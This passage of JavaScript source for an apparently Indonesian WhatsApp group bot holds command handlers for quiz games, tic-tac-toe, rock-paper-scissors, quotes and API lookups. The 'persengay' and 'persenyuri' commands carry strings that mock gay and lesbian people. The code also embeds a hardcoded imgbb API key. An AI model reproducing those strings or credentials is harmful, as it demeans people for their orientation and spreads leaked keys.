											kata5 = `*${anu.result.flag}* \n_Dari Negara Manakah Bendera Tersebut?_\n\nTimeout 120 detik`
											jawaban5 = anu.result.name
											client.sendMessage(from, kata5, text,  {quoted: mek }).then(() => {
												tebakbendera[sender.split('@')[0]] = jawaban5.toLowerCase()
												fs.writeFileSync("./database/json/tebakbendera.json", JSON.stringify(tebakbendera))
											})
											await sleep(120000)
											if (tebakbendera.hasOwnProperty(sender.split('@')[0])) {
												reply("Jawaban: " + jawaban5)
												delete tebakbendera[sender.split('@')[0]]
												fs.writeFileSync("./database/json/tebakbendera.json", JSON.stringify(tebakbendera))
											}
											await limitAdd(sender) 
											break 
									case 'siapakahaku':
										if (siapakahaku.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
										if (!isRegistered) return reply(mess.only.userB)
										if (isBanned) return reply(mess.only.benned)
										if (!isGroup) return reply(mess.only.group)
										if (isLimit(sender)) return reply(mess.limituser)
										anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/siapaaku?apikey=${LolApi}`, {method: 'get'})
									    kata6 = `*${anu.result.question}*\n\nTime out 120 detik`
									    jawaban6 = anu.result.answer
									    client.sendMessage(from, kata6, text,  {quoted: mek }).then(() => {
										siapakahaku[sender.split('@')[0]] = jawaban6.toLowerCase()
										fs.writeFileSync("./database/json/siapakahaku.json", JSON.stringify(siapakahaku))
									})
									await sleep(120000)
									if (siapakahaku.hasOwnProperty(sender.split('@')[0])) {
										reply("Jawaban: " + jawaban6)
										delete siapakahaku[sender.split('@')[0]]
										fs.writeFileSync("./database/json/siapakahaku.json", JSON.stringify(siapakahaku))
									}
									await limitAdd(sender) 
									break 
									case 'tebakjenaka':
										if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
										if (!isRegistered) return reply(mess.only.userB)
		                                if (isBanned) return reply(mess.only.benned)
		                                if (!isGroup) return reply(mess.only.group)
		                                if (isLimit(sender)) return reply(mess.limituser)
											anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/jenaka?apikey=${LolApi}`, {method: 'get'})
											kata7 = `*${anu.result.question}*\n\nTime out 120 detik`
											jawaban7 = anu.result.answer
											client.sendMessage(from, kata7, text,  {quoted: mek }).then(() => {
												tebakjenaka[sender.split('@')[0]] = jawaban7.toLowerCase()
												fs.writeFileSync("./database/json/tebakjenaka.json", JSON.stringify(tebakjenaka))
											})
											await sleep(120000)
											if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) {
												reply("Jawaban: " + jawaban7)
												delete tebakjenaka[sender.split('@')[0]]
												fs.writeFileSync("./database/json/tebakjenaka.json", JSON.stringify(tebakjenaka))
											}
											await limitAdd(sender) 
											break 
					case 'tebakkimia':
						if (tebakkimia.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
						if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (!isGroup) return reply(mess.only.group)
						if (isLimit(sender)) return reply(mess.limituser)	
							anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/unsurkimia?apikey=${LolApi}`, {method: 'get'})
							kimia8 = `*${anu.result.nama}*\n\nTime out 120 detik`
							jawaban8 = anu.result.lambang
							client.sendMessage(from, kimia8, text,  {quoted: mek }).then(() => {
								tebakkimia[sender.split('@')[0]] = jawaban8.toLowerCase()
								fs.writeFileSync("./database/json/tebakkimia.json", JSON.stringify(tebakkimia))
							})
							await sleep(120000)
							if (tebakkimia.hasOwnProperty(sender.split('@')[0])) {
								reply("Jawaban: " + jawaban8)
								delete tebakkimia[sender.split('@')[0]]
								fs.writeFileSync("./database/json/tebakkimia.json", JSON.stringify(tebakkimia))
							}
							await limitAdd(sender) 
							break 
				case 'tebaklirik':
					if (tebaklirik.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (!isGroup) return reply(mess.only.group)
					if (isLimit(sender)) return reply(mess.limituser)
							anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/lirik?apikey=${LolApi}`, {method: 'get'})
							lirik9 = `*${anu.result.question}*\n\nTime out 120 detik`
							jawaban9 = anu.result.answer
							client.sendMessage(from, lirik9, text,  {quoted: mek }).then(() => {
								tebaklirik[sender.split('@')[0]] = jawaban9.toLowerCase()
								fs.writeFileSync("./database/json/tebaklirik.json", JSON.stringify(tebaklirik))
							})
							await sleep(120000)
							if (tebaklirik.hasOwnProperty(sender.split('@')[0])) {
								reply("Jawaban: " + jawaban9)
								delete tebaklirik[sender.split('@')[0]]
								fs.writeFileSync("./database/json/tebaklirik.json", JSON.stringify(tebaklirik))
							}
						await limitAdd(sender) 
							break 
                case 'ttt':
                case 'tictactoe':
	                            if (!isRegistered) return reply(mess.only.userB)
	                            if (isBanned) return reply(mess.only.benned)
	                            if (!isGroup) return reply(mess.only.group)
                            	if (isLimit(sender)) return reply(mess.limituser)
                                if (args.length < 1) return reply('Tag lawan anda! ')
                                if (isTTT) return reply('Sedang ada permainan di grup ini, harap tunggu')
                                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target Lawan!')
ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
player1 = sender
player2 = ment[0]
angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
id = from
gilir = player2
ky_ttt.push({player1,player2,id,angka,gilir})
client.sendMessage(from, `*🎳 Memulai Game Tictactoe 🎲*

@${sender.split('@')[0]} menantang @${player2.split('@')[0]} untuk menjadi lawan Game🔥
Ketik Y/N untuk menerima atau menolak permainan

Ketik ${prefix}deltt 
Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player1,player2]}})
await limitAdd(sender)           
break
                       case 'deltt':
								if (!isRegistered) return reply(mess.only.userB)
								if (isBanned) return reply(mess.only.benned)
								if (!isGroup) return reply(mess.only.group)
								if (isLimit(sender)) return reply(mess.limituser)
                                if (!isTTT) return reply('Tidak Ada Permainan Di Grup Ini')
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa 
reply('Sukses mereset game')
break
                case 'suit': 
				    if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (!isGroup) return reply(mess.only.group)
					if (isLimit(sender)) return reply(mess.limituser)
                    if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
                    const userspilih = q
                    if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
                    var computer = Math.random();
                    if (computer < 0.34 ) {
                    computer = 'batu';
                    } else if( computer >= 0.34 && computer < 0.67) {
                    computer = 'gunting';
                    } else {
                    computer = 'kertas';
                    }
                    if ( userspilih == computer ) {
                    reply(`Pertandingan Seri!`)
                    } else if ( userspilih == 'batu' ) {
                    if( computer == 'gunting' ) {
                    reply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
                    } else {
                    reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
                    }
                    } else if ( userspilih == 'gunting' ) {
                    if( computer == 'batu' ) {
                    reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
                    } else {
                    reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
                    }
                    } else if ( userspilih == 'kertas' ) {
                    if( computer == 'batu' ) {
                    reply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
                    } else {
                    reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
                    }
                    }
                    break
                 case 'caklontong':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (!isGroup) return reply(mess.only.group)
					if (isLimit(sender)) return reply(mess.limituser)
				    data = fs.readFileSync('./IXBTEAM/caklontong.js');
				    cak = JSON.parse(data);
				    lontong = Math.floor(Math.random() * cak.length);
				    randKey = cak[lontong];
				    Pertanyaan = randKey.result.soal
				    Jawaban = '\n*'+randKey.result.desc +'*'
					setTimeout( () => {
					client.sendMessage(from, Jawaban, text, {quoted: mek})
					}, 30000)
					setTimeout( () => {
					client.sendMessage(from, '_10 Detik lagi_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_20 Detik lagi_', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Detik lagi_', text) // ur cods
					}, 2500) // 1000 = 1s
					client.sendMessage(from, Pertanyaan, text, {quoted: mek})
					await limitAdd(sender) 
				    break
				case 'family100':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
				    data = fs.readFileSync('./IXBTEAM/family100.js');
				    fami = JSON.parse(data);
				    ly100 = Math.floor(Math.random() * fami.length);
				    randKey = fami[ly100];
				    Pertanyaan = randKey.result.soal
					setTimeout( () => {
					client.sendMessage(from, '*➸ Jawaban :* \n```'+randKey.result.jawaban +'```', text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					  reply('_Waktu Anda Habis_')
					}, 29000)
					setTimeout( () => {
					client.sendMessage(from, '_10 Detik lagi_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
				    client.sendMessage(from, '_20 Detik lagi_', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Detik lagi_', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '*'+ Pertanyaan +'*', text, {quoted: mek }) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender) 
					break 
				case 'sambungkata':
                    if (sambungkata.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
                    if (args.length == 0) return reply(`Example: ${prefix + command} tahu`)
                    ini_txt = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/sambungkata?apikey=${LolApi}&text=${ini_txt}`)
                    get_result = get_result.result
                    await client.sendMessage(from, get_result, text, { quoted: mek }).then(() => {
                        sambungkata[sender.split('@')[0]] = get_result.toLowerCase()
                        fs.writeFileSync("./database/json/sambungkata.json", JSON.stringify(sambungkata))
                    })
                    break
                case 'cancelsambungkata':
                    if (!sambungkata.hasOwnProperty(sender.split('@')[0])) return reply("Anda tidak memiliki tebak gambar sebelumnya")
                    delete sambungkata[sender.split('@')[0]]
                    fs.writeFileSync("./database/json/sambungkata.json", JSON.stringify(sambungkata))
                    reply("Success mengcancel sambung kata sebelumnya")
                    break
                case 'deteksiumur':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
	            var imgbb = require('imgbb-uploader')
	            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	            ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	            owgi = await client.downloadAndSaveMediaMessage(ted)
	            anu = await imgbb("f8978995fb109cc5487b6183f5ef56bd", owgi)
	            hehe = await fetchJson(`http://api.lolhuman.xyz/api/agedetect?apikey=${LolApi}&img=${anu.display_url}`)
	            gender = `[ DETEKSI UMUR ] \nMenurut bot.. seseorang di gambar tersebut berumur = *${hehe.result}*`
	            client.sendMessage(from, gender, text, {quoted:mek}).then(() => {
				fs.unlinkSync(owgi)
				})
	            } else {
	            reply('Jangan tambah kan apapun pada command')
	            }
	            await limitAdd(sender) 
	            break
			case 'fordward':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
	                client.sendMessage(from, `${body.slice(10)}`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true }})
                    break
             case 'nickff': 
			 if (!isRegistered) return reply(mess.only.userB)
			 if (isBanned) return reply(mess.only.benned)
			 if (isLimit(sender)) return reply(mess.limituser)
					data = await fetchJson(`https://api.zeks.me/api/nickepep?apikey=${zeksapi}`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Nick* : ${i}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
              case 'hurufterbalik': // By Anker
			  if (!isRegistered) return reply(mess.only.userB)
			  if (isBanned) return reply(mess.only.benned)
			  if (isLimit(sender)) return reply(mess.limituser)
					gatauda = body.slice(14)
					anu = await fetchJson(`https://videfikri.com/api/hurufterbalik/?query=${gatauda}`, {method: 'get'})
					reply(anu.result.kata)
					await limitAdd(sender)
					break
			case 'bpfont':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
			bp = `${body.slice(8)}`
			anu = await fetchJson(`https://api.terhambar.com/bpk?kata=${bp}`, {method: 'get'})
			reply (anu.text)
			await limitAdd(sender) 
			break  
         case 'quotesimage':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
                    get_result = await getBuffer(`http://api.lolhuman.xyz/api/random/${command}?apikey=${LolApi}`)
                    client.sendMessage(from, get_result, image, { quotes: mek })
                    break
                case 'faktaunik':
                case 'katabijak':
                case 'pantun':
                case 'bucin':
                	if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/random/${command}?apikey=${LolApi}`)
                    reply(get_result.result)
                    await limitAdd(sender) 
                    break
                case 'randomnama':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)	
                    anu = await fetchJson(`http://api.lolhuman.xyz/api/random/nama?apikey=${LolApi}`)
                    reply(anu.result)
                    await limitAdd(sender) 
                    break
				case 'tagihanlistrik':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)	
					if (args.length == 0) return reply(`Kirim: ${prefix +command} ID Pel\nContoh: ${prefix + command} 1234567890`)
					try{
					reply(mess.wait)
                    anu = await fetchJson(`https://api.lolhuman.xyz/api/tagihanlistrik/${args[0]}?apikey=${LolApi}`)
					listrik = `*ID :* ${anu.result.id}\n`
					listrik += `*Nama :* ${anu.result.name}\n`
					listrik += `*Tagihan :* ${anu.result.amount}`
                    reply(listrik)
                    await limitAdd(sender) 
				    } catch (e){
					reply(mess.error.bug)
					}
                    break
                case 'artinama':
        	        if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (args.length == 0) return reply(`Example: ${prefix + command} IvAn BOT`)
                    ini_nama = args.join(" ")
                  //get_result = await fetchJson(`http://api.lolhuman.xyz/api/artinama?apikey=${LolApi}&nama=${encodeURIComponent(ini_nama)}`)
					get_result = await fetchJson(`https://api.vhtear.com/artinama?nama=${encodeURIComponent(ini_nama)}&apikey=${VthearApi}`)
				  //reply(get_result.result)
					reply(get_result.result.hasil)
                    await limitAdd(sender) 
                    break
                case 'jodoh':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)	
                    if (args.length == 0) return reply(`Example: ${prefix + command} Aku & Kamu`)
                    ini_nama = args.join(" ").split("&")
                    nama1 = ini_nama[0].trim()
                    nama2 = ini_nama[1].trim()
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jodoh/${encodeURIComponent(nama1)}/${encodeURIComponent(nama2)}?apikey=${LolApi}`)
                    get_result = get_result.result
                    ini_txt = `*Positif :* ${get_result.positif}\n`
                    ini_txt += `*Negative :* ${get_result.negatif}\n`
                    ini_txt += `*Deskripsi :* ${get_result.deskripsi}`
                    reply(ini_txt)
                    await limitAdd(sender) 
                    break
                case 'weton':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)		
                    if (args.length == 0) return reply(`Example: ${prefix + command} 12 12 2020`)
                    ini_tanggal = args[0]
                    ini_bulan = args[1]
                    ini_tahun = args[2]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/weton/${ini_tanggal}/${ini_bulan}/${ini_tahun}?apikey=${LolApi}`)
                    get_result = get_result.result
                    ini_txt = `Weton : ${get_result.weton}\n`
                    ini_txt += `Pekerjaan : ${get_result.pekerjaan}\n`
                    ini_txt += `Rejeki : ${get_result.rejeki}\n`
                    ini_txt += `Jodoh : ${get_result.jodoh}`
                    reply(ini_txt)
                    await limitAdd(sender) 
                    break
                case 'tanggaljadian':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)	
                    if (args.length == 0) return reply(`Example: ${prefix + command} 12 12 2020`)
                    ini_tanggal = args[0]
                    ini_bulan = args[1]
                    ini_tahun = args[2]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadian/${ini_tanggal}/${ini_bulan}/${ini_tahun}?apikey=${LolApi}`)
                    get_result = get_result.result
                    ini_txt = `Karakteristik : ${get_result.karakteristik}\n`
                    ini_txt += `Deskripsi : ${get_result.deskripsi}`
                    reply(ini_txt)
                    await limitAdd(sender) 
                    break
                case 'tebakumur':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)		
                    if (args.length == 0) return reply(`Example: ${prefix + command} IvAn BOT`)
                    ini_name = args.join(" ")
                    if (args.length == 0) return reply(`Example: ${prefix + command} IvAn BOT`)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/tebakumur?apikey=${LolApi}&name=${ini_name}`)
                    get_result = get_result.result
                    ini_txt = `Nama : ${get_result.name}\n`
                    ini_txt += `Umur : ${get_result.age}`
                    reply(ini_txt)
                    await limitAdd(sender) 
                    break
                case 'citacita':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)	
                //reply(mess.wait)
                anu = await getBuffer(`https://pencarikode.xyz/api/cita-cita?apikey=pais`, {method: 'get'})                
                client.sendMessage(from, anu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                await limitAdd(sender) 
                break 
              case 'mimpi':
			    	if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)	
			    reply(mess.wait)
			        anu = await fetchJson(`https://api.arugaz.my.id/api/primbon/tafsirmimpi?mimpi=${body.slice(7)}`, {method: 'get'})
			        mimpi = `Arti Mimpi *${body.slice(7)}* Adalah:\n${anu.result.hasil}`
			        client.sendMessage(from, mimpi, text, {quoted: mek})
			        await limitAdd(sender) 
			       	break 
				case 'quotes':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)		
				 data = fs.readFileSync('./IXBTEAM/quotes.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 randQuote = 'Author: *'+randKey.author+'*\n\n*'+randKey.quotes+'*'
                 client.sendMessage(from, randQuote, text, {quoted: mek})
				await limitAdd(sender) 
				break 
				case 'fakta':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
					anu = await fetchJson(`https://api.arugaz.my.id/api/random/text/faktaunik`, {method: 'get'})
					fakta = `Faktanya: *${anu.result}*`
					client.sendMessage(from, fakta, text, {quoted: mek})
					await limitAdd(sender) 
					break 
				case 'katabijak2':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)	
					anu = await fetchJson(`https://api.arugaz.my.id/api/random/text/katabijak`, {method: 'get'})
					katabijak = `Kata Bijak: *${anu.result}*`
					client.sendMessage(from, katabijak, text, {quoted: mek})
					await limitAdd(sender) 
					break 
				case 'motivasi':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)	
					anu = await fetchJson(`https://pencarikode.xyz/api/motivasi?apikey=pais`, {method: 'get'})
					mott = `Motivasi: *${anu.message}*`
					client.sendMessage(from, mott, text, {quoted: mek})
					await limitAdd(sender) 
					break 

		    case 'darkjokes':
			case 'darkjoke':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				reply(mess.wait)
				 data = fs.readFileSync('./IXBTEAM/drak.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 darkjokes = await getBuffer(randKey.result)
                 client.sendMessage(from, darkjokes, image, {quoted: mek, caption: '*GELAP BOS :V*'})
				await limitAdd(sender) 
				break  
			case 'katailham':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				hasil = katailham[Math.floor(Math.random() * (katailham.length))]
				client.sendMessage(from, '*'+hasil+'*', text, {quoted: mek})
				await limitAdd(sender)
				break 
				case 'katadilan':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				hasil = katadilan[Math.floor(Math.random() * (katadilan.length))]
				client.sendMessage(from, '*'+hasil+'*', text, {quoted: mek})
				await limitAdd(sender)
				break 
				
			case 'katacinta':
				if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/katacinta`, {method: 'get'})
				katacin = `*${anu.result}*`
				client.sendMessage(from, katacin, text, {quoted: mek})
				await limitAdd(sender) 
				break  

			case 'persengay':
			case 'gaypersen':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				if (args.length < 1) return reply('tag temanmu!')
				rate = body.slice(11)
				persengayy = ["*4%*\n\n*Tobat Ngegay Gan:v*","*9%*\n\n*OTW Tobat Gan:v*","*17%*\n\n*Kang Coli*","*28%*\n\n*Buset Dah Gay🤦*","*34%*\n\n *Korban Tusbol*","*48%*\n\n*Kang Hunter Bool:v*","*59%*\n\n *Bahaya Ni Orang Gan*","*62%*\n\n*Hati² Sama Ni Orang Beneran Dah*","*74%*\n\n*Astagfirullah Kabur Gan🏃🌬️*","83%\n\n Yaallah Nak🤦","97%\n\nAstagfirullah🤦","100%\n\nKabur ae Gan Daripada Ditusbol Bool lu🏃","29%\n\n amann:v","94%\n\n Yaallah🏃","75%\n\nHadehh Gay🤦","82%\n\nMending Lu Tobat Dah🏃","41%\n\nSering Cari Bool Diperempatan","39%\n\nSering Tusbol Bool Topan🏃"]
				const kl = persengayy[Math.floor(Math.random() * persengayy.length)]
				client.sendMessage(from, 'Persen Gay: '+rate+'\n\nJawaban : '+kl+'', text, { quoted: mek })
				await limitAdd(sender) 
				break  
				
				case 'persenyuri':
			    case 'yuripersen':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
				if (args.length < 1) return reply('tag temanmu!')
				rate = body.slice(12)
				persenyuri = ["*4%*\n\n*Tobat Ngeyuri Gan:v*","*9%*\n\n*OTW Tobat Gan:v*","*17%*\n\n*Yuri dikit:v*","*28%*\n\n*Buset Dah Yuri🤦*","*34%*\n\n *Korban Keyurian*","*48%*\n\n*Yuri trosss:v*","*59%*\n\n *Bahaya Ni Orang Gan*","*62%*\n\n*Hati² Sama Ni Orang Beneran Dah*","*74%*\n\n*Astagfirullah Kabur Gan🏃🌬️*","83%\n\n Yaallah Nak🤦","97%\n\nAstagfirullah🤦","100%\n\nJiwa² Yuriii:v?","29%\n\n amann:v","94%\n\n Yaallah🏃","75%\n\nHadehh Lesbi🤦","82%\n\nMending Lu Tobat Dah🏃","41%\n\nNgelesbi Trosss","39%\n\nSering Bet Ni Ngelesbi🏃"]
				const km = persenyuri[Math.floor(Math.random() * persenyuri.length)]
				client.sendMessage(from, 'Persen Yuri: '+rate+'\n\nJawaban : '+km+'', text, { quoted: mek })
				await limitAdd(sender) 
				break  
			case 'persenbucin':
			case 'bucinpersen':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				if (args.length < 1) return reply('Mana Nama?')
				rate = body.slice(13)
				persenbucin = ["4%\n\nHadehh🤦","9%\n\nMasih Kecil Dah Bucin Ae","17%\n\nNakk Masih Kecil","28%\n\nYoalahh hmm","34%\n\nMayan Lah","48%\n\nGatau","59%\n\nBiasa Kang Bucin","62%\n\n Hadehhh🏃","74%\n\n bucen Teroosss","83%\n\n Sekali² kek Ga bucin Gitu","97%\n\nHadehh Pakboi²","100%\n\nHadehhh Ini Bukan Bucin Tapi Pakboi","29%\n\nKasian Mana Masih Muda","94%\n\n Dasar Pakboi","75%\n\n Ya Ampun"]
				const pbucin = persenbucin[Math.floor(Math.random() * persenbucin.length)]
				client.sendMessage(from, 'Persen Bucin Kak: '+rate+'\n\nJawaban : '+ pbucin +'', text, { quoted: mek })
				await limitAdd(sender) 
				break 
			case 'addquotebucin':
                    if (!isOwner) return reply(mess.only.owner)
				    huu = body.slice(10)
						bucinrandom.push(huu)
						fs.writeFileSync('./database/json/bucin.json', JSON.stringify(bucinrandom))
						reply(`Sukses, Kata \n*${huu}*\n Telah Ditambahkan ke database`)
						break
                    case 'quotebucin':
						if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (isLimit(sender)) return reply(mess.limituser)
                    hasil = bucinrandom[Math.floor(Math.random() * (bucinrandom.length))]
                    client.sendMessage(from, '*'+hasil+'*', text, {quoted: mek})
                    await limitAdd(sender)
                    break
                
///ANIME MENU
                case 'wait':
				case 'whatanime':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						media = await client.downloadMediaMessage(encmedia)
						await wait(media).then(res => {
							client.sendMessage(from, res.video, video, {quoted: mek, caption: res.teks.trim()})
						}).catch(err => {
							reply(err)
						})
					} else {
						reply('Foto aja mas')
					}
					break 
				case 'wait2':
				case 'whatanime2':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        const filePath = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        const form = new FormData();
                        const stats = fs.statSync(filePath);
                        const fileSizeInBytes = stats.size;
                        const fileStream = fs.createReadStream(filePath);
                        form.append('img', fileStream, { knownLength: fileSizeInBytes });
                        const options = {
                            method: 'POST',
                            credentials: 'include',
                            body: form
                        }
                        get_result = await fetchJson(`http://api.lolhuman.xyz/api/wait?apikey=${LolApi}`, {...options })
                        fs.unlinkSync(filePath)
                        get_result = get_result.result
                        ini_video = await getBuffer(get_result.video)
                        ini_txt = `Anilist id : ${get_result.anilist_id}\n`
                        ini_txt += `MAL id : ${get_result.mal_id}\n`
                        ini_txt += `Title Romaji : ${get_result.title_romaji}\n`
                        ini_txt += `Title Native : ${get_result.title_native}\n`
                        ini_txt += `Title English : ${get_result.title_english}\n`
                        ini_txt += `at : ${get_result.at}\n`
                        ini_txt += `Episode : ${get_result.episode}\n`
                        ini_txt += `Similarity : ${get_result.similarity}`
                        await client.sendMessage(from, ini_video, video, { quoted: mek, caption: ini_txt })
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
             case 'bahasajepang':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				uptime = process.uptime()	
				client.sendMessage(from, bahasajepang(prefix), text, {quoted: mek})
			    break 
			case 'basjep':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				uptime = process.uptime()
				
			    client.sendMessage(from, basjep(prefix), text, {quoted: mek})
			    break 
			case 'bjgreeting':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, bjgreeting(prefix), text, {quoted: mek})
			    break 
			case 'bjkataganti':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
			    client.sendMessage(from, kataganti(prefix), text, {quoted: mek})
			    break 
			case 'bjangka':
				if (!isRegistered) return reply(mess.only.userB)
